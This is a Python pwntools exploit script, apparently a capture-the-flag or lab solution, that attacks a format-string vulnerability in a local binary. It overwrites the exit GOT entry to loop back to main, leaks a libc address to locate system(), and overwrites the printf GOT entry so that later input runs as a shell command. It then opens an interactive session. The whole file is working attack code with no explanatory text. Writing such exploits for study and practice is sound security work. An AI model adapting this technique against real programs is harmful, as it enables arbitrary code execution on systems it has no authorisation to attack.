#!/usr/bin/env python3

from pwn import *
from pwnlib.util.packing import p64

def exit_to_main(p: process):
    buf_pos = 10
    func_main = 0x401175
    got_exit = 0x404038

    fmt_str = f'%{func_main-2}cAA%{buf_pos}$n'
    fmt_str += ' '*(32-len(fmt_str)) 

    fmt_str = fmt_str.encode('utf-8') + p64(got_exit)

    p.sendline(fmt_str)
    p.recvuntil('AA')

def printf_to_system(p: process):
    buf_pos = 37
    got_printf = 0x404020

    fmt_str = f'%{buf_pos}$p'
    fmt_str = fmt_str.encode('utf-8')

    log.info(str(fmt_str))
    #gdb.attach(p)
    p.sendline(fmt_str)

    p.recvuntil('0x')
    leak = int(p.recvline(), 16)
    libc_base = leak - 0x21bf7
    libc_system = libc_base + 0x4f550
    libc_system_hi = (libc_system & 0xff0000) >> 16
    libc_system_lo = (libc_system & 0x00ffff)
    write_after_hi = libc_system_lo - libc_system_hi
    
    log.info(str(f'leak = {hex(leak)}'))
    log.info(str(f'libc_base = {hex(libc_base)}'))
    log.info(str(f'libc_system = {hex(libc_system)}'))

    buf_pos = 10

    fmt_str = f'%{libc_system_hi}c%{buf_pos}$hhn%{write_after_hi}c%{buf_pos+1}$hnAA'
    fmt_str += ' '*(32-len(fmt_str)) 
    fmt_str = fmt_str.encode('utf-8') + p64(got_printf + 2) + p64(got_printf)
    
    #gdb.attach(p)
    p.sendline(fmt_str)
    p.recvuntil('AA')


def main():
    p = process('./a.out')

    exit_to_main(p)
    printf_to_system(p)

    p.interactive()

if __name__ == '__main__':
    main()